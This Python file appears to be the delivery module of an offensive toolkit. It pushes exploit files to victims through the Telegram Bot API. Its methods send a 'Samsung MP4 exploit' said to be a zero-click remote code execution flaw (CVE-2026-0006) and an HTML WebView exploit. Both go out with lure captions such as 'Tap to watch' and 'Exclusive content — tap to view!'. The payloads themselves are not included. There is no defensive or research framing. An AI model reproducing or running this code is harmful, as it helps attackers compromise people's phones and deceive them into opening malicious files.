# core/delivery.py — Telegram Bot

import os
import requests
import time

class TelegramDelivery:
    def __init__(self, bot_token: str, chat_id: str):
        self.token = bot_token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{self.token}"
    
    def send_text(self, text: str) -> bool:
        url = f"{self.api_url}/sendMessage"
        try:
            r = requests.post(url, data={'chat_id': self.chat_id, 'text': text, 'parse_mode': 'HTML'}, timeout=10)
            return r.status_code == 200
        except:
            return False
    
    def send_video(self, video_path: str, caption: str = "") -> bool:
        """Send MP4 — target auto-downloads = zero-click"""
        url = f"{self.api_url}/sendVideo"
        try:
            with open(video_path, 'rb') as f:
                files = {'video': f}
                data = {'chat_id': self.chat_id, 'caption': caption}
                r = requests.post(url, files=files, data=data, timeout=30)
                return r.status_code == 200
        except:
            return False
    
    def send_document(self, file_path: str, caption: str = "") -> bool:
        """Send HTML file — opens in WebView = zero-click"""
        url = f"{self.api_url}/sendDocument"
        try:
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': self.chat_id, 'caption': caption}
                r = requests.post(url, files=files, data=data, timeout=30)
                return r.status_code == 200
        except:
            return False
    
    def deliver_samsung(self, mp4_data: bytes) -> bool:
        """Deliver Samsung MP4 exploit"""
        temp = "/tmp/samsung_exploit.mp4"
        with open(temp, 'wb') as f:
            f.write(mp4_data)
        
        caption = """🔥 SAMSUNG A06 EXPLOIT 🔥

📱 Target: Samsung A06
🎯 CVE-2026-0006 — Zero-Click RCE
🇪🇹 Made in Ethiopia

*Tap to watch* 👇"""
        
        success = self.send_video(temp, caption)
        try:
            os.remove(temp)
        except:
            pass
        return success
    
    def deliver_webview(self, html_data: bytes) -> bool:
        """Deliver WebView fallback"""
        temp = "/tmp/webview_exploit.html"
        with open(temp, 'wb') as f:
            f.write(html_data)
        
        caption = "🔥 Exclusive content — tap to view!"
        
        success = self.send_document(temp, caption)
        try:
            os.remove(temp)
        except:
            pass
        return success